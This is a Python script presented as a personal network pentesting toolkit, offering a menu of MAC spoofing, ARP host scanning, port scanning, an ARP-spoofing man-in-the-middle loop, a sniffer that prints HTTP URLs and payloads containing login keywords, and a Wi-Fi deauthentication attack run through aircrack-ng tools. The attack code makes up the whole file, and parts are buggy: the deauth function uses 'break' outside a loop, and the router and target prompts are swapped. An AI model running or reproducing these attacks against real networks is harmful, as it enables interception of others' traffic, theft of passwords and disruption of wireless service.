#!/usr/bin/python3
## Network pentesting Toolkit by Mrk
## Install scapy layers

import subprocess
import argparse
import time
import sys
import re
import socket
import scapy.all as scapy
from scapy.layers import http


print("""                                             		                         
                        @@@%%%%%%&@@@                       
                     @@@%%%%%%%%%%%%%@@@                    
                   @@%%%%%%%%%%%%%%%%%%%@@                  
                 @@%%%%%%%%%%%%%%%%%%%%%%%@@                
                @@%%%%%%%%%%%%%%%%%%%%%%%%%@@               
              /@%%%%%%%%%%%%%%%%%%%%%%%%%%%%&@(             
              @@%%@@@@..................@@@@%%@@             
             @@@@&@@%@.................@@@@&@@@@            
              @@&&&@@@.................@@@&&&@@             
               @@&&&&@@...............@@&&&&@@              
                @@&&&&&@@...........@@&&&&&@@               
                 @@@&&&&@@@@.....@@@&&&&&@@,                
                 ,@@@@@@@@@.../...&@@@@@@@@,                
          @@.%%%%%%%%%%%%%%%@@@@@%%%%%%%%%%%%%%%#@@           
        @@                                      ...@@       
        ,@                  @@@@@              ....@@       
        %@&             @@ @@@@@@@ @@          ...(@%       
      @@%@@              .@@@@@@@@@.           ...@@%@@     
    @@%%%@@             #(@@((@((@@((          ...@@%%%@@   
    @@%%%%@.            @@@@((@((@@@@         ....@&%%%@@   
     @@%%%@@            @   @@@@@   @         ...@@%%%@@    
      @@%%@@                                  ...@@%%@@     
       @@*......................................,,,,@@          
	""")
print("""
 -
  _   _      _                      _      _______          _      
 | \ | |    | |                    | |    |__   __|        | |     
 |  \| | ___| |___      _____  _ __| | __    | | ___   ___ | |___  
 | . ` |/ _ \ __\ \ /\ / / _ \| '__| |/ /    | |/ _ \ / _ \| / __| 
 | |\  |  __/ |_ \ V  V / (_) | |  |   <     | | (_) | (_) | \__ \ 
 |_| \_|\___|\__| \_/\_/ \___/|_|  |_|\_\    |_|\___/ \___/|_|___/ \n""")

print("[+] Welcome, what do you wish to do ?")
print("---------------------------------")
print("[1] MAC address changer")
print("[2] Network Scanner")
print("[3] Port Scanner")
print("[4] Arp spoofing attack")
print("[5] Password and Url sniffer")
print("[6] Deauthorization Attack")
print("---------------------------------")

option = int(input("[+] Where do you want to start ?: "))

## MAC ADDRESS CHANGER ##
def mac_changer():
	interface = input("[+] Please input the name of the interface you wish to change it's MAC address: ")
	new_mac = input("[+] Specify the new MAC address you wish to use for the interface" + interface)
	subprocess.run(["sudo", "ifconfig", interface, "down"])
	print("[=] Chaning MAC address to the desired one: ")
	subprocess.run(["sudo", "ifconfig", interface, "hw", "ether", new_mac])
	subprocess.run(["ifconfig", interface, "up"])

## NETWORK SCANNER ##
def net_scan():
	def scan(ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast/arp_request
		answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
		# Create and empty list which will store all dictionaries
		clients_list = []
		for element in answered_list:
			# For each element in list creates a dictionary that contains a key called ip and a key called mac 
			client_dic = {"ip": element[1].psrc, "mac": element[1].hwsrc}
			# Adding every dictionary to clients_list
			clients_list.append(client_dic)
		return clients_list
	def print_result(results_list):
			print("\n\nIP\t\t\tMAC Address\n------------------------------------------")
			for client in results_list:
				print(client["ip"] + "\t\t" + client["mac"])

	target = input("[+] Please, set IP range you wish to scan: ")
	scan_result = scan(target)
	print_result(scan_result)

## 	PORT SCANNER ##
def port_scan():
	ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
	port_range_pattern = re.compile("([0-9]+)-([0-9]+)")
	port_min = 0
	port_max = 65535
	open_ports = []
	while True:
	    ip_add_entered = input("[+] Please enter the ip address you wish to scan: ")
	    if ip_add_pattern.search(ip_add_entered):
	        print(f"[+] {ip_add_entered} is a valid ip address")
	        break

	while True:
	    port_range = input("[+] Please enter the range of ports you want to scan like so: 23-80...  ")
	    port_range_valid = port_range_pattern.search(port_range.replace(" ",""))
	    if port_range_valid:
	        port_min = int(port_range_valid.group(1))
	        port_max = int(port_range_valid.group(2))
	        break

	for port in range(port_min, port_max + 1):
	    try:
	        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:    
	            s.settimeout(0.5)
	            s.connect((ip_add_entered, port))
	            open_ports.append(port)

	    except:
	        print(f"[-] Port {port} is closed on {ip_add_entered}.")
	for port in open_ports:
	    print(f"[+] Port {port} is open on {ip_add_entered}.")

## ARP SPOOF ##
def arp_spoof():
	def get_mac(ip):
		arp_request = scapy.ARP(pdst=ip)
		broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast = broadcast/arp_request
		answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
		
		return answered_list[0][1].hwsrc

	def spoof(target_ip, spoof_ip):
		target_mac = get_mac(target_ip)
		# Create ARP packet and send it to target
		packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
		scapy.send(packet, verbose=False)

	def restore(dest_ip, src_ip):
		dest_mac = get_mac(dest_ip)
		src_mac = get_mac(src_ip)
		packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
		scapy.send(packet, verbose=False)

	router_ip = input("[+] Enter the target ip address: ")
	target_ip = input("[+] Enter the router ip address: ")

	sent_packets_count = 0 
	try:
		while True:
			spoof(target_ip, router_ip)
			spoof(router_ip, target_ip)
			sent_packets_count = sent_packets_count + 2
			print("\r[=] Packets sent: " + str(sent_packets_count), end="")
			time.sleep(2)
	except KeyboardInterrupt:
		print("\n[+] Program ended by user, quitting and restorin ARP tables...")
		restore(target_ip, router_ip)

	# Run echo 1 > /proc/sys/net/ipv4/ip_forward to forward traffic

## P*SSWRD AND URL SNIFFER ##
def psswd_url_sniff():
	def sniff(interface):
		scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
	
	def get_url(packet):
		return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

	def get_login(packet):
		if packet.haslayer(scapy.Raw):
				
				load = str(packet[scapy.Raw].load)
				
				keywords = ["username", "password", "user", "passwd", "usr", "login", "pass"]
				for keyword in keywords:
					if keyword in load:
						return load

	def process_sniffed_packet(packet):
		if packet.haslayer(http.HTTPRequest):
			
			url = get_url(packet)
			print("[+] HTTPRequest >> " + url.decode())

			login_info = get_login(packet)
			if login_info:
				print("\n\n[+] Possible login info >> " + login_info + "\n\n\n")
			
	interface = input("[+] Interface you wish to use for sniffing attack: ")
	sniff(interface)

## DEAUTHORIZATION ATTACK
def deauth_attack():
	try:
		print("[+] Use Ctrl + c at any time to quit scan and proceed to deauth attack.")
		interface = input("[+] Please specify the interface you wish to use: ")
		subprocess.run(["ifconfig", interface, "down"])
		# Kill processes in network
		subprocess.run(["sudo", "airmon-ng", "check", "kill"])
		subprocess.run(["iwconfig", interface, "mode", "monitor"])
		subprocess.run(["ifconfig", interface, "up"])

		band = int(input("[+] Check for 2 or 5G networks? Input 2 for 2G and 5 for 5G or 1 for both:"))
		if band == 2:
			subprocess.run(["sudo", "airodump-ng", interface])
		elif band ==5:
			subprocess.run(["sudo", "airodump-ng", "--band", "a", interface])
		elif band ==1:
			subprocess.run(["sudo", "airodump-ng", "--band", "abg", interface])
		else:
			print("[-] None of the above chosen, quitting program")
			break
	except KeyboardInterrupt:
		try:
			print("[+] Please specify the details of your desired network:")
			print("-------------------------------------------------------")
			bssid = input("[+] Router MAC address: ")
			channel = input("[+] Channel used: ")
			print("[+] Ctrl + c to proceed when you wish")

			subprocess.run(["sudo", "airodump", "--bssid", bssid, "--channel", channel])

		except KeyboardInterrupt:
			target_bssid = input("[+] Client MAC address you wish to target: ")
			print("[=] Running Deauth attack...")

			subprocess.run(["sudo", "aireplay-ng", "--deauth", "1000000000000", "-a", bssid, "-c", target_bssid, interface])

## OPTIONS
if option == 1:
	mac_changer()
elif option == 2:
	net_scan()
elif option == 3:
	port_scan()
elif option == 4:
	arp_spoof()
elif option == 5:
	psswd_url_sniff()
elif option == 6:
	deauth_attack()
else:
	print("[-] None of the options were chosen, exiting...")
